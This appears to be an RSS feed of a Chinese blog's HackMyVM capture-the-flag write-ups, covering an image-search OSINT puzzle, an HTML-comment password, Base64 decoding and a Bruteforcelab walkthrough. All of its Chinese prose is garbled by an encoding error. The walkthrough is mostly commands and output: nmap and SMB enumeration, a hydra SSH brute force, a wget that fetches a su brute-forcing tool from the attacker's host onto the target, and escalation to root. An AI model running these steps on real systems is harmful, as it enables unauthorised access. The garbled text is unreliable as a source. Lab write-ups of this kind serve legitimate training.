ËÆøÈóÆÊåëÊàòÈ°µÈù¢ÂêéÔºåÈ°µÈù¢ÊòæÁ§∫‰∏Ä‰∏™ÈóÆÈ¢ò 'Who is she?'ÔºàÂ•πÊòØË∞ÅÔºüÔºâÔºåÂπ∂ÈôÑÂ∏¶‰∫Ü‰∏ÄÂº†‰∫∫Áâ©ÁÖßÁâá„ÄÇÂêåÊó∂ÔºåÈ°µÈù¢ÁªôÂá∫‰∫Ü Flag ÁöÑÊ†ºÂºèË¶ÅÊ±ÇÔºö`HMV{namelastname}`ÔºåÂπ∂‰∏æ‰æã `HMV{johnwick}`„ÄÇËøôË°®ÊòéÊàë‰ª¨ÈúÄË¶ÅËØÜÂà´Âá∫ÂõæÁâá‰∏≠ÁöÑ‰∫∫Áâ©ÔºåÂπ∂Â∞ÜÂÖ∂ÂßìÂêçÊåâÁÖß‚ÄúÂêçÂßì‚ÄùÔºàÂ∞èÂÜôÔºåÊó†Á©∫Ê†ºÔºâÁöÑÊ†ºÂºèÂ°´ÂÖ• Flag ‰∏≠„ÄÇ

ÂõæÁâáÂÜÖÂÆπÂ¶Ç‰∏ãÔºö

![ÊåëÊàò003‰∏≠ÁöÑ‰∫∫Áâ©ÂõæÁâá](https://7r1umphk.github.io/image/20250502150641114.jpg)

### ÂàÜÊûê‰∏éÊäÄÊúØËØ¥Êòé

ËØ•ÊåëÊàòÁöÑÊ†∏ÂøÉ‰ªªÂä°ÊòØ**ÈÄöËøáÂõæÂÉèËØÜÂà´ÁâπÂÆö‰∫∫Áâ©**„ÄÇËøôÊòØ‰∏Ä‰∏™ÂÖ∏ÂûãÁöÑ**ÂºÄÊ∫êÊÉÖÊä•ÔºàOpen Source Intelligence, OSINTÔºâ**Êî∂ÈõÜÂú∫ÊôØÔºåÁâπÂà´ÊòØÂú®Ê∂âÂèäÂõæÂÉè‰ø°ÊÅØÊó∂„ÄÇËß£ÂÜ≥Ê≠§Á±ªÈóÆÈ¢òÁöÑÂ∏∏Áî®‰∏îÊúâÊïàÁöÑÊäÄÊúØÊòØ**ÂèçÂêëÂõæÂÉèÊêúÁ¥¢ (Reverse Image Search)**„ÄÇ

**ÂèçÂêëÂõæÂÉèÊêúÁ¥¢**ÊòØ‰∏ÄÁßçÂÖÅËÆ∏Áî®Êà∑‰ΩøÁî®ÂõæÂÉè‰Ωú‰∏∫Êü•ËØ¢Êù°‰ª∂Êù•ÊêúÁ¥¢‰∫íËÅîÁΩëÁöÑÊäÄÊúØ„ÄÇ‰∏éËæìÂÖ•ÂÖ≥ÈîÆËØçÊü•ÊâæÁõ∏ÂÖ≥ÊñáÊú¨ÊàñÂõæÂÉè‰∏çÂêåÔºåÁî®Êà∑‰∏ä‰º†‰∏ÄÂº†ÂõæÁâáÊàñÊèê‰æõÂõæÁâáÁöÑ URLÔºåÊêúÁ¥¢ÂºïÊìé‰ºöÊü•Êâæ‰∏éËØ•ÂõæÁâáÁõ∏ÂêåÊàñËßÜËßâ‰∏äÁõ∏‰ººÁöÑÂõæÁâáÔºåÂπ∂ÂèØËÉΩÊèê‰æõÂÖ≥‰∫éÂõæÁâáÊù•Ê∫ê„ÄÅÂÜÖÂÆπ‰ª•ÂèäÁõ∏ÂÖ≥ÁΩëÈ°µÁöÑ‰ø°ÊÅØ„ÄÇ

Â∏∏Áî®ÁöÑÂèçÂêëÂõæÂÉèÊêúÁ¥¢ÊúçÂä°ÂåÖÊã¨Ôºö

*   Google Images (Ë∞∑Ê≠åÂõæÁâáÊêúÁ¥¢)
*   TinEye
*   Bing Visual Search (ÂøÖÂ∫îËßÜËßâÊêúÁ¥¢)
*   Yandex Images

### Ê±ÇËß£ËøáÁ®ã

1. **ÊâßË°åÂèçÂêëÊêúÁ¥¢:** Êàë‰ª¨ÈÄâÊã©‰ΩøÁî® **Google Images** ËøõË°åÂèçÂêëÊêúÁ¥¢„ÄÇËÆøÈóÆ Google Images ÁΩëÁ´ô ([https://images.google.com/](https://images.google.com/))ÔºåÁÇπÂáªÊêúÁ¥¢Ê°Ü‰∏≠ÁöÑÁõ∏Êú∫ÂõæÊ†áÔºàSearch by imageÔºâÔºåÁÑ∂ÂêéÁ≤òË¥¥ÂõæÁâáÁöÑ URL Êàñ‰∏ä‰º†Â∑≤‰øùÂ≠òÁöÑÂõæÁâáÊñá‰ª∂„ÄÇ
2. **ÂàÜÊûêÁªìÊûú:** Google Images ÁöÑÊêúÁ¥¢ÁªìÊûúËøÖÈÄüËØÜÂà´Âá∫‰∫ÜÂõæÁâá‰∏≠ÁöÑ‰∫∫Áâ©„ÄÇ

   ![GoogleÂõæÁâáÊêúÁ¥¢ÁªìÊûú](https://7r1umphk.github.io/image/20250502151052521.png)

   ÊêúÁ¥¢ÁªìÊûúÊòéÁ°ÆÊåáÂá∫ËØ•‰∫∫Áâ©ÊòØ **Gata Cattana**„ÄÇ

3. **Ê†ºÂºèÂåñ Flag:** Ê†πÊçÆÊåëÊàòË¶ÅÊ±ÇÁöÑ `HMV{namelastname}` Ê†ºÂºèÔºåÊàë‰ª¨ÈúÄË¶ÅÂ∞ÜÂßìÂêç 'Gata Cattana' ËΩ¨Êç¢‰∏∫Â∞èÂÜôÂπ∂ÂéªÈô§Á©∫Ê†ºÔºåÂæóÂà∞ `gatacattana`„ÄÇÂ∞ÜÂÖ∂ÊîæÂÖ• `HMV{}` ‰∏≠„ÄÇ

### ÁªìÊûúÔºöFlag

ÊúÄÁªàÂæóÂà∞ÁöÑ Flag ÊòØÔºö

```
HMV{gatacattana}
```
sentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/Challenge%20003%20-tu-zhong-shi-shui-%EF%BC%9F.html</guid><pubDate>Fri, 27 Jun 2025 09:28:45 +0000</pubDate></item><item><title>hackmyvmÈù∂Âú∫-Bruteforcelab</title><link>https://7r1UMPHK.github.io/post/hackmyvm-ba-chang--Bruteforcelab.html</link><description># ÁÆÄ‰ªã

![image-20250322203846278](https://7r1umphk.github.io/image/20250322203846321.png)

Èù∂Êú∫Ôºö[Bruteforcelab](https://hackmyvm.eu/machines/machine.php?vm=Bruteforcelab)
 ÈöæÂ∫¶ÔºöÁªøËâ≤
 ÁõÆÊ†á IPÔºö192.168.205.164
 Êú¨Êú∫ IPÔºö192.168.205.128
 Áü•ËØÜÁÇπÔºö'Êó®Âú®Áî®‰∫éÁªÉ‰π†Êö¥ÂäõÁ†¥Ëß£Âíå SMB ÊúçÂä°Âà©Áî®„ÄÇ'

# ‰∏ÄÔºö‰ø°ÊÅØÊî∂ÈõÜ

## 1.nmapÊâ´Êèè

ÂºÄÊâ´ÔºÅ

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test]
‚îî‚îÄ$ nmap -A -Pn -n -p- -T4 192.168.205.164
Starting Nmap 7.95 ( https://nmap.org ) at 2025-03-22 20:39 CST
Nmap scan report for 192.168.205.164
Host is up (0.00033s latency).
Not shown: 65531 closed tcp ports (reset)
PORT      STATE SERVICE     VERSION
22/tcp    open  ssh         OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 1c:db:f8:92:72:c4:72:dc:24:c3:ca:7c:80:eb:f4:81 (RSA)
|   256 7f:30:33:e2:f4:0d:87:41:5e:a3:24:de:57:c6:73:8b (ECDSA)
|_  256 9a:9e:2f:53:e0:2b:b4:98:3f:34:95:53:56:87:a4:76 (ED25519)
10000/tcp open  http        MiniServ 2.021 (Webmin httpd)
|_http-server-header: MiniServ/2.021
|_http-title: 200 &amp;mdash; Document follows
19000/tcp open  netbios-ssn Samba smbd 4
19222/tcp open  netbios-ssn Samba smbd 4
MAC Address: 08:00:27:DB:B7:99 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Device type: general purpose|router
Running: Linux 4.X|5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 4.15 - 5.19, OpenWrt 21.02 (Linux 5.4), MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   0.33 ms 192.168.205.164

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 86.38 seconds
```

ÊòæÁ§∫ÂºÄÊîæ‰∫Ü22„ÄÅ10000„ÄÅ19000„ÄÅ19222Á´ØÂè£ÔºåÂºÄÂêØ‰∫Üssh„ÄÅhttp„ÄÅsmbÊúçÂä°

## 2.SMBÊúçÂä°Êé¢Êµã

‰∏™‰∫∫ÊØîËæÉÂñúÊ¨¢ÂÖàÁúãsmbÊúçÂä°„ÄÇ‰ΩøÁî®smbclientËøõË°åÊé¢Êµã

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test]
‚îî‚îÄ$ smbclient -L //192.168.205.164 -p 19000 
Password for [WORKGROUP\kali]:

        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        Test            Disk      
        IPC$            IPC       IPC Service (Samba 4.13.13-Debian)
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 192.168.205.164 failed (Error NT_STATUS_CONNECTION_REFUSED)
Unable to connect with SMB1 -- no workgroup available

```

ÂèëÁé∞Â≠òÂú®TestÂÖ±‰∫´ÁõÆÂΩïÔºåËøûÊé•ÂêéÂèëÁé∞Â≠òÂú®README.txt

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test]
‚îî‚îÄ$ smbclient //192.168.205.164/Test -p 19000
Password for [WORKGROUP\kali]:
Try 'help' to get a list of possible commands.
smb: \&gt; ls -la
NT_STATUS_NO_SUCH_FILE listing \-la
smb: \&gt; ls
  .                                   D        0  Mon Mar 27 03:06:46 2023
  ..                                  D        0  Mon Mar 27 02:12:02 2023
  README.txt                          N      115  Mon Mar 27 03:06:46 2023

                9232860 blocks of size 1024. 3032372 blocks available

```

Êü•ÁúãREADME.txtÔºåÂèëÁé∞ÂÖ∂Â≠òÂú®Áî®Êà∑Âêç

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test]
‚îî‚îÄ$ cat README.txt   
Hey Andrea listen to me, I'm going to take a break. I think I've setup this prototype for the SMB server correctly

```

*Âòø Andrea Âê¨ÊàëËØ¥ÔºåÊàëË¶Å‰ºëÊÅØ‰∏Ä‰∏ã„ÄÇÊàëÊÉ≥ÊàëÂ∑≤ÁªèÊ≠£Á°ÆÂú∞‰∏∫ SMB ÊúçÂä°Âô®ËÆæÁΩÆ‰∫ÜËøô‰∏™ÂéüÂûã*

# ‰∫åÔºö‰ø°ÊÅØÂà©Áî®

‰ΩøÁî®hydraÊö¥ÂäõÁ†¥Ëß£sshÊúçÂä°ÔºåÂª∫ËÆÆ‰ΩøÁî®xato-net-10-million-passwords-10000.txtÂ≠óÂÖ∏Ôºårockyou.txtÂ≠óÂÖ∏ÂèØËÉΩ‰ºöÂ≠òÂú®Áº∫Â§±ÁöÑÂèØËÉΩ

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test]
‚îî‚îÄ$ hydra -l andrea -P xato10000.txt ssh://192.168.205.164 -I -u -f -e nsr -t 64 
Hydra v9.5 (c) 2023 by van Hauser/THC &amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-03-22 20:55:54
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[WARNING] Restorefile (ignored ...) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 64 tasks per 1 server, overall 64 tasks, 10003 login tries (l:1/p:10003), ~157 tries per task
[DATA] attacking ssh://192.168.205.164:22/
[STATUS] 635.00 tries/min, 635 tries in 00:01h, 9401 to do in 00:15h, 31 active
[22][ssh] host: 192.168.205.164   login: andrea   password: awesome
[STATUS] attack finished for 192.168.205.164 (valid pair found)
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-03-22 20:57:20

```

# ‰∏âÔºöËé∑Âèñshell

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test]
‚îî‚îÄ$ ssh andrea@192.168.205.164               
The authenticity of host '192.168.205.164 (192.168.205.164)' can't be established.
ED25519 key fingerprint is SHA256:jxCJlAEwfgAbyE4RC2RJnQM/Y0rUXe+Yt6q7Y69okUg.
This host key is known by the following other names/addresses:
    ~/.ssh/known_hosts:19: [hashed name]
    ~/.ssh/known_hosts:29: [hashed name]
    ~/.ssh/known_hosts:30: [hashed name]
    ~/.ssh/known_hosts:31: [hashed name]
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.205.164' (ED25519) to the list of known hosts.
andrea@192.168.205.164's password: 
Linux LAB-Bruteforce 5.10.0-21-amd64 #1 SMP Debian 5.10.162-1 (2023-01-21) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Sun Mar 26 21:26:42 2023 from 192.168.1.84
andrea@LAB-Bruteforce:~$ id
uid=1001(andrea) gid=1001(andrea) groups=1001(andrea)
andrea@LAB-Bruteforce:~$ whoami 
andrea
andrea@LAB-Bruteforce:~$ hostname -I
192.168.205.164 

```

# ÂõõÔºöÊèêÊùÉ-root

‰ΩøÁî®suFirceÂ∑•ÂÖ∑Áõ¥Êé•ÁàÜÁ†¥root

## 1.ÂáÜÂ§á

```bash
andrea@LAB-Bruteforce:~$ cd /tmp/
andrea@LAB-Bruteforce:/tmp$ wget 192.168.205.128/suForce
--2025-03-22 14:05:42--  http://192.168.205.128/suForce
Connecting to 192.168.205.128:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 2430 (2.4K) [application/octet-stream]
Saving to: ‚ÄòsuForce‚Äô

suForce                           100%[============================================================&gt;]   2.37K  --.-KB/s    in 0s      

2025-03-22 14:05:42 (4.78 MB/s) - ‚ÄòsuForce‚Äô saved [2430/2430]

andrea@LAB-Bruteforce:/tmp$ wget 192.168.205.128/xato10000.txt
--2025-03-22 14:05:54--  http://192.168.205.128/xato10000.txt
Connecting to 192.168.205.128:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 76497 (75K) [text/plain]
Saving to: ‚Äòxato10000.txt‚Äô

xato10000.txt                     100%[============================================================&gt;]  74.70K  --.-KB/s    in 0s      

2025-03-22 14:05:54 (379 MB/s) - ‚Äòxato10000.txt‚Äô saved [76497/76497]

andrea@LAB-Bruteforce:/tmp$ chmod +x suForce 

```

## 2.ÊíûÂáª

```bash
andrea@LAB-Bruteforce:/tmp$ ./suForce -u root -w xato10000.txt 
            _____                          
 ___ _   _ |  ___|__  _ __ ___ ___   
/ __| | | || |_ / _ \| '__/ __/ _ \ 
\__ \ |_| ||  _| (_) | | | (_|  __/  
|___/\__,_||_|  \___/|_|  \___\___|  
‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ
 code: d4t4s3c     version: v1.0.0
‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ
üéØ Username | root
üìñ Wordlist | xato10000.txt
üîé Status   | 3412/10000/34%/1998
üí• Password | 1998
‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ


andrea@LAB-Bruteforce:/tmp$ su -
Password: 
root@LAB-Bruteforce:~# id
uid=0(root) gid=0(root) groups=0(root)

```

sentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/hackmyvm-ba-chang--Bruteforcelab.html</guid><pubDate>Fri, 27 Jun 2025 09:28:35 +0000</pubDate></item><item><title>Challenge 002 Ê∫êÁ†Å‰πãÂØÜ</title><link>https://7r1UMPHK.github.io/post/Challenge%20002%20-yuan-ma-zhi-mi.html</link><description>### ÊåëÊàò‰ø°ÊÅØ

*   **ÊåëÊàòÂêçÁß∞/ÁºñÂè∑:** Challenge 002
*   **ÊåëÊàòÈìæÊé•:** [https://hackmyvm.eu/challenges/challenge.php?c=002](https://hackmyvm.eu/challenges/challenge.php?c=002)

### ÂàùÂßãËßÇÂØü

![ÊåëÊàò002ÂàùÂßãÁïåÈù¢](https://7r1umphk.github.io/image/20250502150050288.png)

ËÆøÈóÆÊåëÊàòÈ°µÈù¢ÂêéÔºåÈ°µÈù¢ÂÜÖÂÆπÊèêÁ§∫Êàë‰ª¨ÈúÄË¶ÅËÆøÈóÆÂè¶‰∏Ä‰∏™ÁâπÂÆöÁöÑ URL Êù•Ëé∑Âèñ Flag„ÄÇÂêåÊó∂ÔºåÈ°µÈù¢ÊòéÁ°ÆÊåáÂá∫**Êó†ÈúÄËøõË°åÊö¥ÂäõÁ†¥Ëß£ (No Bruteforce required)**„ÄÇ

Êèê‰æõÁöÑÁõÆÊ†á URL ‰∏∫Ôºö `http://momo.hackmyvm.eu/ch4ll3ng3002/`

### ÂàÜÊûê‰∏éÊäÄÊúØËØ¥Êòé

Ê†πÊçÆÊåáÁ§∫ÔºåÊàë‰ª¨ËÆøÈóÆ‰∫ÜÁõÆÊ†á URL `http://momo.hackmyvm.eu/ch4ll3ng3002/`„ÄÇËØ•È°µÈù¢ÂëàÁé∞‰∏Ä‰∏™ÁÆÄÂçïÁöÑ HTML Ë°®ÂçïÔºåË¶ÅÊ±ÇÁî®Êà∑ËæìÂÖ•ÂØÜÁ†Å‰ª•Ëé∑Âèñ Flag„ÄÇ

Èâ¥‰∫éÊåëÊàòÊòéÁ°ÆÊéíÈô§‰∫ÜÊö¥ÂäõÁ†¥Ëß£ÁöÑÂèØËÉΩÊÄßÔºåËøôÂº∫ÁÉàÊöóÁ§∫ÊâÄÈúÄÂØÜÁ†ÅÂπ∂ÈùûÈÄöËøáÁåúÊµãÊàñÂ≠óÂÖ∏ÊîªÂáªËé∑ÂæóÔºåËÄåÊòØÂèØËÉΩ‰ª•ÊüêÁßçÈùûÊòæËÄåÊòìËßÅÁöÑÊñπÂºèÈöêËóèÂú®ÂΩìÂâçÈ°µÈù¢ÊàñÂÖ∂ÂÖ≥ËÅîËµÑÊ∫ê‰∏≠„ÄÇÂú® Web ÂÆâÂÖ®È¢ÜÂüüÔºåÊ£ÄÊü•ÂÆ¢Êà∑Á´Ø‰æßËµÑÊ∫êÔºåÁâπÂà´ÊòØ **HTML Ê∫ê‰ª£Á†Å**ÔºåÊòØÂèëÁé∞Ê≠§Á±ª‰ø°ÊÅØÁöÑÂ∏∏Áî®ÊäÄÊúØÊâãÊÆµ„ÄÇ

Web ÊµèËßàÂô®Âú®Ê∏≤ÊüìÈ°µÈù¢Êó∂‰ºöËß£Êûê HTML ‰ª£Á†ÅÔºå‰ΩÜÊ∫ê‰ª£Á†ÅÊú¨Ë∫´ÂåÖÂê´‰∫ÜÂºÄÂèëËÄÖÁºñÂÜôÁöÑÊâÄÊúâÊ†áËÆ∞ÂíåÊ≥®Èáä„ÄÇÂºÄÂèëËÄÖÊúâÊó∂‰ºöÂú®Ê≥®Èáä‰∏≠Áïô‰∏ãË∞ÉËØï‰ø°ÊÅØ„ÄÅËØ¥ÊòéÁîöËá≥ÊòØÊïèÊÑüÊï∞ÊçÆ„ÄÇ

### Ëß£Á†Å/Ê±ÇËß£ËøáÁ®ã

Êàë‰ª¨Âú®ÊµèËßàÂô®‰∏≠ÂØπÁõÆÊ†áÈ°µÈù¢ `http://momo.hackmyvm.eu/ch4ll3ng3002/` ÊâßË°å‚ÄúÊü•ÁúãÁΩëÈ°µÊ∫ê‰ª£Á†Å‚ÄùÊìç‰Ωú„ÄÇ‰ªîÁªÜÊ£ÄÊü•Ê∫ê‰ª£Á†ÅÂêéÔºåÂú® `&lt;form&gt;` ÂÖÉÁ¥†ÂÜÖÈÉ®ÂèëÁé∞‰∫Ü‰∏ÄÊÆµË¢´ `&lt;!--` Âíå `--&gt;` ÂåÖË£πÁöÑ **HTML Ê≥®Èáä**Ôºö

```html
&lt;!doctype html&gt;
&lt;html lang='en'&gt;
&lt;title&gt;002&lt;/title&gt;
Password to obtain the flag.
    &lt;form class='form-signin' action='passcheck.php' method='post'&gt;
      &lt;input type='password' name='password' id='password' placeholder='Password' required&gt;
      &lt;input type='submit' value='Send'&gt;
      &lt;!-- isthisthepassword? --&gt;  &lt;!-- Ê≠§Â§ÑÂèëÁé∞Ê≥®ÈáäÂÜÖÂÆπ --&gt;
    &lt;/form&gt;
  &lt;/body&gt;
&lt;/html&gt;
```

ËØ•Ê≥®ÈáäÂÜÖÂÆπ‰∏∫Ôºö

```
isthisthepassword?
```

ËøôÊÆµÊñáÊú¨ÊûÅÊúâÂèØËÉΩÂ∞±ÊòØÂØªÊâæÁöÑÂØÜÁ†Å„ÄÇÊàë‰ª¨Â∞ÜÊ≠§Â≠óÁ¨¶‰∏≤ `isthisthepassword?` Â°´ÂÖ•È°µÈù¢ÁöÑÂØÜÁ†ÅËæìÂÖ•Ê°ÜÔºåÂπ∂Êèê‰∫§Ë°®Âçï„ÄÇ

ÊúçÂä°Âô®È™åËØÅÈÄöËøáÂêéÔºåËøîÂõû‰∫ÜÂåÖÂê´ Flag ÁöÑÈ°µÈù¢„ÄÇ

### ÁªìÊûúÔºöFlag

ÊàêÂäüËé∑ÂèñÁöÑ Flag ‰∏∫Ôºö

```
HMV{thatwasreallyeazy}
```
sentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/Challenge%20002%20-yuan-ma-zhi-mi.html</guid><pubDate>Fri, 27 Jun 2025 09:28:32 +0000</pubDate></item><item><title>Challenge 001 Base64 ÁºñÁ†ÅËß£Êûê</title><link>https://7r1UMPHK.github.io/post/Challenge%20001%20Base64%20-bian-ma-jie-xi.html</link><description>### ÊåëÊàò‰ø°ÊÅØ

*   **ÊåëÊàòÂêçÁß∞/ÁºñÂè∑:** Challenge 001
*   **ÊåëÊàòÈìæÊé•:** [https://hackmyvm.eu/challenges/challenge.php?c=001](https://hackmyvm.eu/challenges/challenge.php?c=001)

### ÂàùÂßãËßÇÂØü

![ÊåëÊàò001ÁïåÈù¢](https://7r1umphk.github.io/image/20250502145552213.png)

ËÆøÈóÆÊåëÊàòÈ°µÈù¢ÂêéÔºåÊàë‰ª¨ÁúãÂà∞È°µÈù¢‰∏äÁªôÂá∫‰∫Ü‰∏Ä‰∏™Â≠óÁ¨¶‰∏≤Ôºö

```
aG12e2Jhc2U2NGRlY29kZXJ9
```


‰ªªÂä°ÊòæÁÑ∂ÊòØÈúÄË¶ÅÂØπËøô‰∏™Â≠óÁ¨¶‰∏≤ËøõË°åËß£Á†ÅÊàñËß£ÈáäÔºå‰ª•Ëé∑Âèñ Flag„ÄÇ

### ÂàÜÊûê‰∏éÊäÄÊúØËØ¥Êòé

ÁªôÂá∫ÁöÑÂ≠óÁ¨¶‰∏≤ `aG12e2Jhc2U2NGRlY29kZXJ9` ÂÖ∑Êúâ **Base64 ÁºñÁ†Å**ÁöÑÂÖ∏ÂûãÁâπÂæÅÔºö

1.  **Â≠óÁ¨¶ÈõÜ:** ÂÆÉÂÆåÂÖ®Áî±Â§ßÂÜôÂ≠óÊØç (`A-Z`)„ÄÅÂ∞èÂÜôÂ≠óÊØç (`a-z`) ÂíåÊï∞Â≠ó (`0-9`) ÁªÑÊàê„ÄÇÂÆåÊï¥ÁöÑ Base64 Â≠óÁ¨¶ÈõÜËøòÂåÖÊã¨ `+` Âíå `/` Â≠óÁ¨¶ÔºåÂπ∂‰ΩøÁî® `=` ‰Ωú‰∏∫Â°´ÂÖÖÁ¨¶Ôºå‰∏çËøáËøô‰∫õÁâπÊÆäÂ≠óÁ¨¶Âπ∂Êú™Âá∫Áé∞Âú®Êú¨‰æãÁöÑÂ≠óÁ¨¶‰∏≤‰∏≠„ÄÇ
2.  **Áî®ÈÄî:** ÈúÄË¶ÅÊòéÁ°ÆÁöÑÊòØÔºåBase64 ÊòØ‰∏ÄÁßç**ÁºñÁ†ÅÔºàEncodingÔºâ**ÊñπÊ°àÔºåËÄå‰∏çÊòØ**Âä†ÂØÜÔºàEncryptionÔºâ**ÊñπÊ≥ï„ÄÇÂÆÉÁöÑ‰∏ªË¶ÅÁõÆÁöÑÊòØÂ∞Ü**‰∫åËøõÂà∂Êï∞ÊçÆ**Ôºà‰æãÂ¶ÇÂõæÁâá„ÄÅÂèØÊâßË°åÊñá‰ª∂Êàñ‰ªªÊÑèÂ≠óËäÇÂ∫èÂàóÔºâËΩ¨Êç¢‰∏∫**Á∫ØÊñáÊú¨**Ê†ºÂºèÔºå‰ª•‰æøÂú®Âè™ÊîØÊåÅÊñáÊú¨‰º†ËæìÁöÑÂ™í‰ªã‰∏ä‰º†Ëæì„ÄÇËøôÂØπ‰∫éÂÉèÁîµÂ≠êÈÇÆ‰ª∂ÔºàMIME ÂçèËÆÆÔºâ„ÄÅXML Êàñ JSON Á≠âÂü∫‰∫éÊñáÊú¨ÁöÑÊ†ºÂºè‰∏≠ÂµåÂÖ•‰∫åËøõÂà∂Êï∞ÊçÆËá≥ÂÖ≥ÈáçË¶Å„ÄÇ
3.  **ÂéüÁêÜÁÆÄËø∞:** Base64 ÁöÑÂ∑•‰ΩúÂéüÁêÜÊòØÂ∞ÜËæìÂÖ•ÁöÑ**ÊØè 3 ‰∏™Â≠óËäÇÔºà24 ÊØîÁâπÔºâ**ÁöÑÊï∞ÊçÆËΩ¨Êç¢‰∏∫ **4 ‰∏™ Base64 Â≠óÁ¨¶**„ÄÇÊØè‰∏™ Base64 Â≠óÁ¨¶‰ª£Ë°®ÂéüÂßãÊï∞ÊçÆ‰∏≠ÁöÑ 6 ‰∏™ÊØîÁâπÔºàÂõ†‰∏∫ 2 ÁöÑ 6 Ê¨°ÊñπÁ≠â‰∫é 64ÔºåÂØπÂ∫î Base64 ÁöÑ 64 ‰∏™Âü∫Êú¨Â≠óÁ¨¶Ôºâ„ÄÇÂ¶ÇÊûúËæìÂÖ•Êï∞ÊçÆÁöÑÂ≠óËäÇÊï∞‰∏çÊòØ 3 ÁöÑÂÄçÊï∞ÔºåÈÄöÂ∏∏‰ºöÂú®ÁºñÁ†ÅÁªìÊûúÁöÑÊú´Â∞æÊ∑ªÂä†‰∏Ä‰∏™Êàñ‰∏§‰∏™ `=` Â°´ÂÖÖÁ¨¶ÔºåÁî®Êù•ÊåáÁ§∫ÂéüÂßãÊï∞ÊçÆÁöÑÁ≤æÁ°ÆÈïøÂ∫¶„ÄÇÊú¨‰æã‰∏≠Â≠óÁ¨¶‰∏≤Êú´Â∞æÊ≤°Êúâ `=`ÔºåËøôË°®Á§∫ÂéüÂßãÊï∞ÊçÆÁöÑÂ≠óËäÇÊï∞ÊÅ∞Â•ΩÊòØ 3 ÁöÑÂÄçÊï∞„ÄÇ

### Ëß£Á†ÅËøáÁ®ã

Êàë‰ª¨ÂèØ‰ª•‰ΩøÁî®Â§öÁßçÂ∑•ÂÖ∑Êù•Ëß£Á†Å Base64 Â≠óÁ¨¶‰∏≤„ÄÇ**CyberChef** ÊòØ‰∏Ä‰∏™ÂäüËÉΩÂº∫Â§ß‰∏îÂπøÂèóÊ¨¢ËøéÁöÑÈÄâÊã©Ôºö

1.  **ËÆøÈóÆ** CyberChef ÁΩëÁ´ô: [https://gchq.github.io/CyberChef/](https://gchq.github.io/CyberChef/)
2.  **ËæìÂÖ• (Input):** Â∞ÜÂ≠óÁ¨¶‰∏≤ `aG12e2Jhc2U2NGRlY29kZXJ9` Á≤òË¥¥Âà∞‚ÄúInput‚ÄùËæìÂÖ•Ê°Ü‰∏≠„ÄÇ
3.  **ÈÄâÊã©Êìç‰Ωú (Operations):** Âú®Â∑¶‰æßÁöÑÊìç‰ΩúÂàóË°®‰∏≠ÊêúÁ¥¢ 'From Base64'ÔºåÁÑ∂ÂêéÂ∞ÜÂÖ∂ÊãñÊãΩÂà∞‚ÄúRecipe‚ÄùÂå∫Âüü„ÄÇ
4.  **ËæìÂá∫ (Output):** ‚ÄúOutput‚ÄùÂå∫ÂüüÂ∞ÜËá™Âä®ÊòæÁ§∫Ëß£Á†ÅÂêéÁöÑÁªìÊûú„ÄÇ

ÂΩìÁÑ∂Ôºå‰πüÂèØ‰ª•‰ΩøÁî®ÂëΩ‰ª§Ë°åÂ∑•ÂÖ∑Ôºö

*   Âú® Linux/macOS Á≥ªÁªü‰∏ãÔºö
    ```bash
    echo 'aG12e2Jhc2U2NGRlY29kZXJ9' | base64 -d
    ```
